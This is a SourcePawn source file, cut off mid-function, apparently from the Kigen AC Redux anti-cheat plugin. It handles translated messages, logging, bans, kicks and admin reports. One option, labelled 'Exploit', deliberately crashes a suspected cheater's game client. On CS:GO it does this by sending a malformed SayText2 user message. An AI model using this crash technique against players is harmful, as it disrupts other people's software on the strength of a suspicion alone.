// Copyright (C) 2007-2011 CodingDirect LLC
// This File is licensed under GPLv3, see 'Licenses/License_KAC.txt' for Details
// All Changes to the original Code are licensed under GPLv3, see 'Licenses/License_KACR.txt' for Details


//- Translation Stocks -//

/*
* Translates an String depending on the Clients Region
* 
* @param iClient		Client UID.
* @param cTranslation	The Name of the Translation.
* @param cDestination	The Destination String for the Output.
* @param iMaxlenght		Maximum Lenght of the Destination String.
*/
KACR_Translate(const iClient, const char[] cTranslation, char[] cDestination, const iMaxlenght)
{
	if (iClient)
		g_hCLang[iClient].GetString(cTranslation, cDestination, iMaxlenght);
		
	else
		g_hSLang.GetString(cTranslation, cDestination, iMaxlenght);
}

/*
* Sends an Translated Command Reply to an Client
* 
* @param iClient		Client UID.
* @param cTranslation	The Name of the Translation.
* @param ...			Variable number of format parameters.
*/
KACR_ReplyTranslatedToCommand(const iClient, const char[] cTranslation, any ...)
{
	char cBuffer[256], cFormat[256];
	
	if (iClient < 1)
		g_hSLang.GetString(cTranslation, cFormat, sizeof(cFormat));
		
	else
		g_hCLang[iClient].GetString(cTranslation, cFormat, sizeof(cFormat));
		
	VFormat(cBuffer, sizeof(cBuffer), cFormat, 3);
	ReplyToCommand(iClient, "[Kigen AC Redux] %s", cBuffer);
}

/*
* Sends an Translated Message to the Server Console
* 
* @param cTranslation	The Name of the Translation.
* @param ...			Variable number of format parameters.
*/
KACR_PrintTranslatedToServer(const char[] cTranslation, any ...)
{
	char cBuffer[256], cFormat[256];
	g_hSLang.GetString(cTranslation, cFormat, sizeof(cFormat));
	VFormat(cBuffer, sizeof(cBuffer), cFormat, 2);
	PrintToServer("[Kigen-AC_Redux] %s", cBuffer);
}

/*
* Sends an Translated Message to a Client
* 
* @param iClient		Client UID.
* @param cTranslation	The Name of the Translation.
* @param ...			Variable number of format parameters.
*/
stock KACR_PrintTranslatedToChat(const iClient, const char[] cTranslation, any ...) // Currently unused
{
	char cBuffer[256], cFormat[256];
	g_hCLang[iClient].GetString(cTranslation, cFormat, sizeof(cFormat));
	VFormat(cBuffer, sizeof(cBuffer), cFormat, 3);
	PrintToChat(iClient, "[Kigen-AC_Redux] %s", cBuffer);
}

/*
* Sends an Message to all Online Admins
* 
* @param cTranslation	The Name of the Translation.
* @param ...			Variable number of format parameters.
*/
KACR_PrintTranslatedToChatAdmins(const char[] cTranslation, any ...)
{
	char cBuffer[256], cFormat[256];
	for (int i = 1; i <= MaxClients; i++)
	{
		if (g_bIsAdmin[i])
		{
			g_hCLang[i].GetString(cTranslation, cFormat, sizeof(cFormat));
			VFormat(cBuffer, sizeof(cBuffer), cFormat, 2);
			PrintToChat(i, "[Kigen-AC_Redux] %s", cBuffer);
		}
	}
}

/*
* Sends an Translated Message to all Clients
* 
* @param cTranslation	The Name of the Translation.
* @param ...			Variable number of format parameters.
*/
KACR_PrintTranslatedToChatAll(const char[] cTranslation, any ...)
{
	char cBuffer[256], cFormat[256];
	for (int i = 1; i <= MaxClients; i++)
	{
		if (g_bInGame[i])
		{
			g_hCLang[i].GetString(cTranslation, cFormat, sizeof(cFormat));
			VFormat(cBuffer, sizeof(cBuffer), cFormat, 2);
			PrintToChat(i, "[Kigen-AC_Redux] %s", cBuffer);
		}
	}
}

/*
* Kicks an Client with an Translated Reason
* 
* @param iClient		Client UID.
* @param cTranslation	The Name of the Translation.
* @param ...			Variable number of format parameters.
*/
KACR_Kick(const iClient, const char[] cTranslation, any ...)
{
	char cBuffer[256], cFormat[256];
	g_hCLang[iClient].GetString(cTranslation, cFormat, sizeof(cFormat));
	VFormat(cBuffer, sizeof(cBuffer), cFormat, 3);
	KickClient(iClient, "%s", cBuffer);
	OnClientDisconnect(iClient); // Needed, will be executed in the main File
}

/*
* Bans an Client with an Translated Reason and time
* 
* @param iClient		Client UID.
* @param iTime			Bantime, 0 = Forever.
* @param cTranslation	The Translated Ban Reason displayed to the Client, use NULL to use the Ban Reason.
* @param cReason		The Ban Reason.
* @param ...			Variable Number of Format Parameters.
*/
KACR_Ban(const iClient, iTime, const char[] cTranslation, const char[] cReason, any ...)
{
	char cBuffer[256], cEReason[256];
	if (StrEqual(cTranslation, "NULL")) // No Translation existing
		Format(cEReason, sizeof(cEReason), "%s", cReason);
		
	else
		g_hCLang[iClient].GetString(cTranslation, cEReason, 256);
		
	VFormat(cBuffer, sizeof(cBuffer), cReason, 5);
	
	if (g_bSourceBansPP)
		SBPP_BanPlayer(0, iClient, iTime, cBuffer); // Admin 0 is the Server in SBPP, this ID CAN be created or edited manually in the Database to show Name "Server" on the Webpanel
		
	else if (g_bSourceBans)
		SBBanPlayer(0, iClient, iTime, cBuffer);
		
	else
		if(!BanClient(iClient, iTime, BANFLAG_AUTHID, cBuffer, cEReason, "KACR"))
			KACR_Log(false, "[Error] Failed to Server Ban Client '%L'", iClient);
			
	OnClientDisconnect(iClient); // Needed, will be executed in the main File
}


//- Stocks-//

/*
* Makes an String Lowercase
* 
* @param cText	String to Convert.
*/
StringToLower(char[] cText)
{
	int iSize = strlen(cText);
	for (int i = 0; i < iSize; i++)
		cText[i] = CharToLower(cText[i]);
}

/*TODO: Change this in a future Version #26
* Logs an Message to a specific File and can Set the Plugin to failed
* 
* @param iType	Which Type of Message to log/which File to log to (0 = Errors and System Messages, 1 = Suspicions, 2 = Detected Violations, 3 = Actions Taken)
* @param bBreak	Set the Plugins State to failed.
* @param cText	Message to log.
* @param ...	Variable number of format parameters.
*/
/*stock KACR_Log(const iType, const bool bBreak, const char[] cText, any ...)
{
	char cBuffer[256], cPath[256];
	VFormat(cBuffer, sizeof(cBuffer), cText, 4);
	BuildPath(Path_SM, cPath, sizeof(cPath), "logs/KACR.log");
	LogMessage(cBuffer); // Log to SM Log
	LogToFileEx(cPath, "%s", cBuffer); // Log to KACR.log
	
	if (bBreak)
		SetFailState(cBuffer); // Break
}*/

/*
* Logs an Error Message
* 
* @param bBreak	Set the Plugins State to failed.
* @param cText	Message to log.
* @param ...	Variable number of format parameters.
*/
KACR_Log(const bool bBreak, const char[] cText, any ...)
{
	char cBuffer[256], cPath[256];
	VFormat(cBuffer, sizeof(cBuffer), cText, 3);
	BuildPath(Path_SM, cPath, sizeof(cPath), "logs/KACR.log");
	LogMessage(cBuffer); // Log to SM Log
	LogToFileEx(cPath, "%s", cBuffer); // Log to KACR.log
	
	if (bBreak)
		SetFailState(cBuffer); // Break
}


//- Action System -//

/*
* Performens an specified Action
* Combine the Numbers like you desire
* 0 - Do nothing
* 1 - Ban (SB & SB++)
* 2 - Time Ban (SB & SB++) // TODO: Add Option to set the Time
* 4 - Server Ban (banned_user.cfg)
* 8 - Server Time Ban (banned_user.cfg) // TODO: Add Option to set the Time
* 16 - Kick
* 32 - Exploit
* 64 - Report to SB
* 128 - Report to online Admins
* 256 - Report to Admins on Steam
* // TODO:512 - Ask an Steam User for Advice
* 1024 - Log to File
* 2048 - Report using SourceIRC
* // TODO:4096 - Ask on an IRC Channel for Advice
* 8192 - Report to CallAdmin
*
* @param iClient		Client UID.
* @param iAction		What todo with the Client.
* @param iTime			Bantime.
* @param cUserReason	Reason to display to the Client, can be a Translation starting with 'KACR_', leave blank to use cReason. 
* @param cReason		The Reason for the Action.
* @param ...			Variable Number of Format Parameters for cReason.
*/
KACR_Action(const iClient, const iAction, const iTime, const char[] cUserReason, const char[] cReason, any ...)
{
	// TODO: Add limit to Cvars
	// TODO: Make able to block specific Actions from outside?
	// TODO: Make re-runnable
	// TODO: Integrate Compatibility Check for the Actions using a 2d map like the chart we have on gdrive
	// BUG: SBPP, CallAdmin and propably others have an Reason char limit of 128, this may cause an problem
	
	if(iAction == 0) // 0 - Do nothing
		return;
		
	int iActionCheck = iAction; // We do not want to loose the initial Value, we need it later
	
	//- Log/Report Spam Protection -//
	bool bActions[KACR_Action_Count];
	KACR_ActionCheck(iAction, bActions);
	
	if (g_iPauseReports) // 0 = Disabled
	{
		if (bActions[KACR_ActionID_ReportSB] || bActions[KACR_ActionID_ReportAdmins] || bActions[KACR_ActionID_ReportSteamAdmins] || bActions[KACR_ActionID_AskSteamAdmin] || bActions[KACR_ActionID_Log] || bActions[KACR_ActionID_ReportIRC]) // We have an Array so we do not call the Actions toooo often, we do not want to spam the Logs nor the Admins nor SB with Reports
		{
			if (RoundToNearest(GetTickedTime()) - g_iLastCheatReported[iClient] < g_iPauseReports) // #ref 395723
			{
				if (bActions[KACR_ActionID_ReportSB])
					iActionCheck -= KACR_Action_ReportSB;
					
				if (bActions[KACR_ActionID_ReportAdmins])
					iActionCheck -= KACR_Action_ReportAdmins;
					
				if (bActions[KACR_ActionID_ReportSteamAdmins])
					iActionCheck -= KACR_Action_ReportSteamAdmins;
					
				if (bActions[KACR_ActionID_AskSteamAdmin])
					iActionCheck -= KACR_Action_AskSteamAdmin;
					
				if (bActions[KACR_ActionID_Log])
					iActionCheck -= KACR_Action_Log;
					
				if (bActions[KACR_ActionID_ReportIRC])
					iActionCheck -= KACR_Action_ReportIRC;
			}
			
			else
				g_iLastCheatReported[iClient] = RoundToNearest(GetTickedTime()); // BUG: We do not calculate with the Case that KACR_Action does fail, but thats fine
		}
	}
	
	//- Grab IP if needed-//
	char cClientIP[64];
	if (bActions[KACR_ActionID_TimeBan] && iTime < 5 || bActions[KACR_ActionID_Log])
		GetClientIP(iClient, cClientIP, sizeof(cClientIP));
		
	//- Reported Reasons -//
	char cReason2[256], cUserReason2[256];
	VFormat(cReason2, sizeof(cReason2), cReason, 4);
	
	if(StrContains(cUserReason, "KACR_") != -1) // Is Translated
		KACR_Translate(iClient, cUserReason, cUserReason2, sizeof(cUserReason2));
		
	else if(strlen(cUserReason) == 0) // Is Blank
		strcopy(cUserReason2, sizeof(cUserReason2), cReason2);
		
	else // Is valid
		strcopy(cUserReason2, sizeof(cUserReason2), cUserReason);
		
	#if defined DEBUG
	 PrintToServer("[Debug][Kigen AC Redux] Action Incomming with Number '%i' cut down to '%i', Reason '%s' and User Reason '%s'", iAction, iActionCheck, cReason2, cUserReason2);
	#endif
	
	//- Actual Actions beeing callen -//
	if (bActions[KACR_ActionID_Ban]) // 1 - Ban (SB++, SB-MA & SB)
	{
		if (g_bSourceBansPP)
		{
			SBPP_BanPlayer(0, iClient, 0, cReason2); // Admin 0 is the Server in SBPP
			if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
				OnClientDisconnect(iClient); // Needed, will be executed in the main File
		}
		
		else if (g_bSBMaterialAdmin)
		{
			if (!MABanPlayer(0, iClient, MA_BAN_STEAM, 0, cReason2))
			{
				LogError("[Error] Failed to add an SB-MaterialAdmin Ban for '%L'", iClient);
				MALog(MA_LogAction, "[Error][KACR] Failed to add an Ban for '%L'", iClient);
				
				if(!BanClient(iClient, iTime, BANFLAG_AUTHID, cReason2, cUserReason2, "KACR")) // 1 Day
					KACR_Log(false, "[Error] Failed to Server Ban Client '%L', after an SB-MaterialAdmin Ban also failed", iClient);
					
				else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
					OnClientDisconnect(iClient); // Needed, will be executed in the main File
			}
			
			if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
				OnClientDisconnect(iClient); // Needed, will be executed in the main File
		}
		
		else if (g_bSourceBans)
		{
			SBBanPlayer(0, iClient, 0, cReason2);
			if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
				OnClientDisconnect(iClient); // Needed, will be executed in the main File
		}
		
		else
		{
			KACR_Log(false, "[Warning] An SourceBans Ban was called but it isent installed, applying Server Ban instead");
			if(!BanClient(iClient, 0, BANFLAG_AUTHID, cReason2, cUserReason2, "KACR")) // 1 Day
				KACR_Log(false, "[Error] Failed to Server Ban Client '%L', after an SB Ban also failed", iClient);
				
			else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
				OnClientDisconnect(iClient); // Needed, will be executed in the main Filee
		}
	} // End of Action
	
	if (bActions[KACR_ActionID_TimeBan]) // 2 - Time Ban (SB++, SB-MA & SB)
	{
		if (g_bSourceBansPP)
		{
			SBPP_BanPlayer(0, iClient, iTime, cReason2); // Admin 0 is the Server in SBPP, this ID CAN be created or edited manually in the Database to show Name "Server" on the Webpanel
			if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
				OnClientDisconnect(iClient); // Needed, will be executed in the main File
		}
		
		else if (g_bSBMaterialAdmin)
		{
			if (iTime > 5)
			{
				if (!MABanPlayer(0, iClient, MA_BAN_STEAM, iTime, cReason2))
				{
					LogError("[Error] Failed to add an SB-MaterialAdmin Ban for '%L'", iClient);
					MALog(MA_LogAction, "[Error][KACR] Failed to add an Ban for '%L'", iClient);
					
					if(!BanClient(iClient, iTime, BANFLAG_AUTHID, cReason2, cUserReason2, "KACR")) // 1 Day
						KACR_Log(false, "[Error] Failed to Server Ban Client '%L', after an SB-MaterialAdmin Ban also failed", iClient);
						
					else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
						OnClientDisconnect(iClient); // Needed, will be executed in the main File
				}
				
				else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
					OnClientDisconnect(iClient); // Needed, will be executed in the main File
			}
			
			else // Bantime under 5 mins
			{
				char cSteamID[16], cName[MAX_NAME_LENGTH];
				GetClientAuthId(iClient, AuthId_Steam3, cSteamID, 16);
				GetClientName(iClient, cName, sizeof(cName));
				
				if (!MAOffBanPlayer(iClient, MA_BAN_STEAM, cSteamID, cClientIP, cName, iTime, cReason2))
				{
					LogError("[Error] Failed to add an SB Material Admin Offline Ban for '%L'", iClient);
					MALog(MA_LogAction, "[Error][KACR] Failed to add an Offline Ban for '%L'", iClient);
					
					if(!BanClient(iClient, iTime, BANFLAG_AUTHID, cReason2, cUserReason2, "KACR")) // 1 Day
						KACR_Log(false, "[Error] Failed to Server Ban Client '%L', after an SB-MaterialAdmin Offline Ban also failed", iClient);
						
					else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
						OnClientDisconnect(iClient); // Needed, will be executed in the main File
				}
				
				else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
					OnClientDisconnect(iClient); // Needed, will be executed in the main File
			}
		}
		
		else if (g_bSourceBans)
		{
			SBBanPlayer(0, iClient, iTime, cReason2);
			if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
				OnClientDisconnect(iClient); // Needed, will be executed in the main File
		}
		
		else
		{
			KACR_Log(false, "[Warning] An Sourcebans Time Ban was called but isent running, applying Server Time Ban instead");
			if(!BanClient(iClient, iTime, BANFLAG_AUTHID, cReason2, cUserReason2, "KACR"))
				KACR_Log(false, "[Error] Failed to Server Time Ban Client '%L', after an SB Ban also failed", iClient);
				
			else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
				OnClientDisconnect(iClient); // Needed, will be executed in the main File
		}
	} // End of Action
	
	if (bActions[KACR_ActionID_ServerBan]) // 4 - Server Ban (banned_user.cfg)
	{
		if(!BanClient(iClient, 0, BANFLAG_AUTHID, cReason2, cUserReason2, "KACR"))
			KACR_Log(false, "[Error] Failed to Server Ban Client '%L'", iClient);
			
		else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
			OnClientDisconnect(iClient); // Needed, will be executed in the main File
	} // End of Action
	
	if (bActions[KACR_ActionID_ServerTimeBan]) // 8 - Server Time Ban (banned_user.cfg)
	{
		if(!BanClient(iClient, iTime, BANFLAG_AUTHID, cReason2, cUserReason2, "KACR")) // 1 Day
			KACR_Log(false, "[Error] Failed to Server Time Ban Client '%L'", iClient);
			
		else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
			OnClientDisconnect(iClient); // Needed, will be executed in the main File
	} // End of Action
	
	if (bActions[KACR_ActionID_Kick]) // 16 - Kick
	{
		if(!KickClient(iClient, cUserReason2))
			KACR_Log(false, "[Error] Failed to kick Client '%L'", iClient);
			
		else if (g_bAuthorized[iClient]) // Required for the OnClientConnect Trigger
			OnClientDisconnect(iClient); // Needed, will be executed in the main File
	} // End of Action
	
	if (bActions[KACR_ActionID_Exploit]) // 32 - Exploit
	{
		if (!g_bInGame[iClient]) // Error Check: Client not Ingame
		{
			KACR_Log(false, "[Warning] An Client Crash was called but the Target Client isn't In-Game, kicking him instead");
			if(!KickClient(iClient, cUserReason2))
				KACR_Log(false, "[Error] Failed to kick Client '%L', after crashing him got aborted", iClient);	
		}
		
		else if (!g_bMapStarted) // Error Check: Map is changing
		{
			KACR_Log(false, "[Warning] An Client Crash was called but the Client cant be crashed while the Map is still changing, kicking him instead"); // TODO: Replace with an Timed re-run of the KACR_Action Function
			if(!KickClient(iClient, cUserReason2))
				KACR_Log(false, "[Error] Failed to kick Client '%L', after crashing him got aborted", iClient);
		}
		
		else if (g_hGame == Engine_CSGO)
		{
			PrintToChat(iClient, "Due to Cheating, we will let your Game Crash in a few Seconds"); // TODO: Rework Text, make translateable
			PrintHintText(iClient, "Due to Cheating, we will let your Game Crash in a few Seconds"); // TODO: Rework Text, make translateable
			
			DataPack hData = new DataPack();
			hData.WriteString(cUserReason2);
			hData.WriteFloat(view_as<float>(iClient));
			CreateTimer(5.0, KACR_Exploit_Crash_CSGO_Timer, hData, TIMER_FLAG_NO_MAPCHANGE); // BUG: Action may be aborted if called before an MapChange, this is rare so it should be fine
			
			// OnClientDisconnect(iClient); // Executed in the 'CrashClient_ErrorCheck'
		}
		
		else // Only tested on CSS, may work on other Games
		{
			PrintToChat(iClient, "Due to Cheating, we will let your Game Crash in a few Seconds"); // TODO: Rework Text, make translateable
			PrintHintText(iClient, "Due to Cheating, we will let your Game Crash in a few Seconds"); // TODO: Rework Text, make translateable
			
			DataPack hData = new DataPack();
			hData.WriteString(cUserReason2);
			hData.WriteFloat(view_as<float>(iClient));
			hData.WriteCell(0); // TODO: 1 = Numb, Add Numb Feature and make use of functions data input
			CreateTimer(5.0, KACR_Exploit_CrashNumb_CSS, hData, TIMER_FLAG_NO_MAPCHANGE); // BUG: Action may be aborted if called before an MapChange, this is rare so it should be fine
		}
	} // End of Action
	
	if (bActions[KACR_ActionID_ReportSB]) // 64 - Report to SB
	{
		if (g_bSourceBansPP)
			SBPP_ReportPlayer(iClient, iClient, cReason2); // TODO: Edit SBPP so the reporter can be the server(0) like in the webpanel and submit to github
			
		else if (g_bSourceBans)
			SB_ReportPlayer(iClient, iClient, cReason2); // TODO: Edit SBPP so the reporter can be the server(0) like in the webpanel and submit to github
			
		else
			KACR_Log(false, "[Error] An Sourcebans Action was called but it isent running");
	} // End of Action
	
	if (bActions[KACR_ActionID_ReportAdmins]) // 128 - Report to online Admins
	{
		// KACR_PrintTranslatedToChatAdmins(###cTranslation###); // TODO: Match Reasons to find Translations
		
		for (int i = 1; i <= MaxClients; i++)
			if (g_bIsAdmin[i])
				PrintToChat(i, "[Kigen-AC_Redux] Reporting Client '%L' for doing '%s'", iClient, cReason2);
	} // End of Action
	
	if (bActions[KACR_ActionID_ReportSteamAdmins]) // 256 - Tell Admins on Steam about the Violation
	{
		if(g_bASteambot)
		{
			if(ASteambot_IsConnected()) // TODO: No Support for multiply Clients yet due to the 'Ask an Steam User over ASteambot for Advice' thingy which can only work with one person
				KACR_PrintToSteamAdmins("[KACR] Reporting Client '%L' for doing '%s'", iClient, cReason2);

			else
				KACR_Log(false, "[Error] Tried to Use ASteambot but it is not connected to its Backend");
		}
		
		else
			KACR_Log(false, "[Error] An ASteambot Action was called but it isent running");
	} // End of Action
	
	if (bActions[KACR_ActionID_AskSteamAdmin]) // 512 - Ask an Steam User over ASteambot for Advice
	{
		/*if(g_bASteambot) TODO
		{
			if(ASteambot_IsConnected())
			{ // 19.11.21 - 640 Chars, 900 is max so we can actually Send all in one MSG
	KACR_PrintToSteamAdmins("[KACR] Reporting Client '%L' for doing '%s'\n[KACR] Which Action should be taken for this Client?\n[KACR] Options available:\n[KACR] 0 - Dont do anything\n[KACR] 1 - Ban (SB & SB++)\n[KACR] 2 - Time Ban (SB & SB++)\n[KACR] 4 - Server Ban (banned_ip.cfg or banned_user.cfg)\n[KACR] 8 - Server Time Ban (banned_ip.cfg or banned_user.cfg)\n[KACR] 16 - Kick\n[KACR] 32 - Crash Client\n[KACR] 64 - Report to SB\n[KACR] 128 - Report to online Admins\n[KACR] 256 - Tell Admins on Steam about the Violation\n[KACR] 1024 - Log to File\n[KACR] 2048 - Tell about the Violation using SourceIRC[KACR] --------------------[KACR] Enter any Number from above to call an Action\n[KACR] You can also add up the Numbers to call multiply Actions at once"); // I know this is ugly, but i swear, this is the most efficient Way, \n is a line breaker
			
			// TODO: Ask if to display Actions
			// TODO: Warning, we must make this multithread! Else multiply reports could Result in the Plugin going weird
			}
			
			else
				KACR_Log(false, "[Error] Tried to Use ASteambot but it is not connected to its Backend");
		}
		
		else
			KACR_Log(false, "[Error] An ASteambot Action was called but it isent running");
			*/
	} // End of Action
	
	if (bActions[KACR_ActionID_Log]) // 1024 - Log to File
	{
		KACR_Log(false, "Logging Client '%L<%s>' for doing '%s'", iClient, cClientIP, cReason2);
		
		if (bActions[KACR_ActionID_Ban]) // 1 - Ban (SB++, SB-MA & SB)
			KACR_Log(false, "Logging Action 1: Banned Client '%L<%s>'", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_TimeBan]) // 2 - Time Ban (SB++, SB-MA & SB)
			KACR_Log(false, "Logging Action 2: Time Banned Client '%L<%s>' for '%i' Minutes", iClient, cClientIP, iTime);
			
		if (bActions[KACR_ActionID_ServerBan]) // 4 - Server Ban (banned_ip.cfg or banned_user.cfg)
			KACR_Log(false, "Logging Action 4: Server Banned Client '%L<%s>'", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_ServerTimeBan]) // 8 - Server Time Ban
			KACR_Log(false, "Logging Action 8: Server Time Banned Client '%L<%s>' for '%i' Minutes", iClient, cClientIP, iTime);
			
		if (bActions[KACR_ActionID_Kick])
			KACR_Log(false, "Logging Action 16: Kicked Client '%L<%s>'", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_Exploit])
			KACR_Log(false, "Logging Action 32: Exploitet Client '%L<%s>'", iClient, cClientIP); // TODO: BUG: need to be adjusted for numbness
			
		if (bActions[KACR_ActionID_ReportSB]) // 64 - Report to SB
			KACR_Log(false, "Logging Action 64: Reportet Client '%L<%s>' to SourceBans", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_ReportAdmins]) // 128 - Report to online Admins
			KACR_Log(false, "Logging Action 128: Reportet Client '%L<%s>' to all online Admins", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_ReportSteamAdmins]) // 256 - Tell Admins on Steam about the Violation
			KACR_Log(false, "Logging Action 256: Reportet Client '%L<%s>' to all Steam Admins", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_AskSteamAdmin]) // 512 - Ask an Steam User over ASteambot for Advice
			KACR_Log(false, "Logging Action 512: Asked on Steam what todo with Client: %L<%s>", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_ReportIRC]) // 2048 - Tell about the Violation using SourceIRC
			KACR_Log(false, "Logging Action 2048: Reportet Client '%L<%s>' to the specified IRC Channels", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_AskIRCAdmin]) // 4096 - Ask on an IRC Channel for Advice
			KACR_Log(false, "Logging Action 4096: Asked on specified IRC Channels what todo with Client: %L<%s>", iClient, cClientIP);
			
		if (bActions[KACR_ActionID_ReportCallAdmin]) // 8192 - Report to CallAdmin
			KACR_Log(false, "Logging Action 8192: Reportet Client '%L<%s>' to CallAdmin", iClient, cClientIP);
	} // End of Action
	
	if (bActions[KACR_ActionID_ReportIRC]) // 2048 - Tell about the Violation using SourceIRC
	{
		if (g_bSourceIRC)
			IRC_MsgFlaggedChannels("kacr_reports", "[KACR] Reporting Client '%L<%s>' for doing '%s'", iClient, cReason2); // Flag: kacr_reports
			
		else
			KACR_Log(false, "[Error] An SourceIRC Action was called but it isent running");
	} // End of Action
	
	
	if (bActions[KACR_ActionID_AskIRCAdmin]) // 4096 - Ask on an IRC Channel for Advice
	{
		
		if (g_bSourceIRC)
		{
			/*
			IRC_MsgFlaggedChannels("kacr_advice", const String:format[], any:...); // Flag: kacr_advice
			
			[KACR] Reporting Client '%L' for doing '%s'\n[KACR] Which Action should be taken for this Client?\n[KACR] Options available:\n[KACR] 0 - Dont do anything\n[KACR] 1 - Ban (SB & SB++)\n[KACR] 2 - Time Ban (SB & SB++)\n[KACR] 4 - Server Ban (banned_ip.cfg or banned_user.cfg)\n[KACR] 8 - Server Time Ban (banned_ip.cfg or banned_user.cfg)\n[KACR] 16 - Kick\n[KACR] 32 - Crash Client\n[KACR] 64 - Report to SB\n[KACR] 128 - Report to online Admins\n[KACR] 256 - Tell Admins on Steam about the Violation\n[KACR] 1024 - Log to File\n[KACR] 2048 - Tell about the Violation using SourceIRC[KACR] --------------------[KACR] Enter any Number from above to call an Action\n[KACR] You can also add up the Numbers to call multiply Actions at once
			*/
		}
		
		else
			KACR_Log(false, "[Error] An SourceIRC Action was called but it isent running");
		
	} // End of Action
	
	if (bActions[KACR_ActionID_ReportCallAdmin]) // 8192 - Report to CallAdmin
	{
		if(g_bCallAdmin)
			CallAdmin_ReportClient(REPORTER_CONSOLE, iClient, cReason2);
			
		else
			KACR_Log(false, "[Error] An CallAdmin Action was called but it isent running");
	} // End of Action
}

/*
* Checks which Actions are input by iAction
* You will get the Bool Array bActions as Handover
* Use the KACR_Action_* Defines instead of the actual IDs
* 
* @param iAction	Action ID Input.
* @passed bActions	Handover Bool Array with the called Actions inside it.
*/
void KACR_ActionCheck(iAction, bool bActions[KACR_Action_Count]) // I wish i would be better in Math so i could design a Formula for this
{
	loop
	{
		if(iAction < KACR_Action_ReportCallAdmin)
			if(iAction < KACR_Action_AskIRCAdmin)
				if(iAction < KACR_Action_ReportIRC)
					if(iAction < KACR_Action_Log)
						if(iAction < KACR_Action_AskSteamAdmin)
							if(iAction < KACR_Action_ReportSteamAdmins)
								if(iAction < KACR_Action_ReportAdmins)
									if(iAction < KACR_Action_ReportSB)
										if(iAction < KACR_Action_Crash)
											if(iAction < KACR_Action_Kick)
												if(iAction < KACR_Action_ServerTimeBan)
													if(iAction < KACR_Action_ServerBan)
														if(iAction < KACR_Action_TimeBan)
															if(iAction < KACR_Action_Ban) // == 0, negative Values would be strange // 0 - Nothin
																break;
																
															else // == 1 // 1 - 1 - Ban (SB & SB++)
															{
																bActions[KACR_ActionID_Ban] = true;
																iAction -= KACR_Action_Ban;
															}
															
														else // 2 - 2 - Time Ban (SB & SB++)
														{
															bActions[KACR_ActionID_TimeBan] = true;
															iAction -= KACR_Action_TimeBan;
														}
														
													else // 4 - 3 - Server Ban (banned_ip.cfg or banned_user.cfg)
													{
														bActions[KACR_ActionID_ServerBan] = true;
														iAction -= KACR_Action_ServerBan;
													}
													
												else // 8 - 4 - Server Time Ban
												{
													bActions[KACR_ActionID_ServerTimeBan] = true;
													iAction -= KACR_Action_ServerTimeBan;
												}
												
											else // 16 - 5 - Kick
											{
												bActions[KACR_ActionID_Kick] = true;
												iAction -= KACR_Action_Kick;
											}
											
										else // 32 - 6 - Crash Client
										{
											bActions[KACR_ActionID_Exploit] = true;
											iAction -= KACR_Action_Crash;
										}
										
									else // 64 - 7 - Report to SB
									{
										bActions[KACR_ActionID_ReportSB] = true;
										iAction -= KACR_Action_ReportSB;
									}
									
								else // 128 - 8 - Report to online Admins
								{
									bActions[KACR_ActionID_ReportAdmins] = true;
									iAction -= KACR_Action_ReportAdmins;
								}
								
							else // 256 - 9 - Tell Admins on Steam about the Violation
							{
								bActions[KACR_ActionID_ReportSteamAdmins] = true;
								iAction -= KACR_Action_ReportSteamAdmins;
							}
							
						else // 512 - 10 - Ask an Steam User over ASteambot for Advice
						{
							bActions[KACR_ActionID_AskSteamAdmin] = true;
							iAction -= KACR_Action_AskSteamAdmin;
						}
						
					else // 1024 - 11 - Log to File
					{
						bActions[KACR_ActionID_Log] = true;
						iAction -= KACR_Action_Log;
					}
					
				else // 2048 - 12 - Tell about the Violation using SourceIRC
				{
					bActions[KACR_ActionID_ReportIRC] = true;
					iAction -= KACR_Action_ReportIRC;
				}
				
			else // 4096 - 13 - Ask on an IRC Channel for Advice
			{
				bActions[KACR_ActionID_AskIRCAdmin] = true;
				iAction -= KACR_Action_AskIRCAdmin;
			}
			
		else // 8192 - 14 - Report to CallAdmin
		{
			bActions[KACR_ActionID_ReportCallAdmin] = true;
			iAction -= KACR_Action_ReportCallAdmin;
		}
	}
}

/*
* Lets a Client Crash, this Exploit requires UserMessages, currently only proved to work in CSGO (12.6.2020)
* If the Exploit fails, it will kick the Player instead
*/
Action KACR_Exploit_Crash_CSGO_Timer(Handle hTimer, DataPack hData) // BUG: hTimer is marked as unused, and thats true, but compressing the warning... nah
{
	hData.Reset(false); // Reset the Positon, so the Focus is on the first Entry again
	char cReason[256];
	int iClient;
	
	hData.ReadString(cReason, sizeof(cReason));
	view_as<float>(iClient) = hData.ReadFloat();
	//- Crash Client -//
	Handle hSayText = StartMessageOne("SayText2", iClient);
	
	if(hSayText != null)
	{
		PbSetInt(hSayText, "ent_idx", iClient);
		PbSetBool(hSayText, "chat", true);
		PbSetString(hSayText, "msg_name", "a");
		EndMessage();
	}
	
	//- Error Check -//
	DataPack hData2 = new DataPack();
	CreateTimer(5.0 + GetTickInterval(), Exploit_Crash_CSGO_ErrorCheck, hData2, TIMER_FLAG_NO_MAPCHANGE); // TODO:BUG?: Are 5S(+ a Frame) enought, it seems to be fine in CSGO?
	hData2.WriteString(cReason);
	hData2.WriteFloat(view_as<float>(iClient));
}

Action Exploit_Crash_CSGO_ErrorCheck(Handle hTimer, DataPack hData) // BUG: hTimer is marked as unused, and thats true, but compressing the warning... nah
{
	hData.Reset(false); // Reset the Positon, so the Focus is on the first Entry again
	char cReason[256];
	int iClient;
	
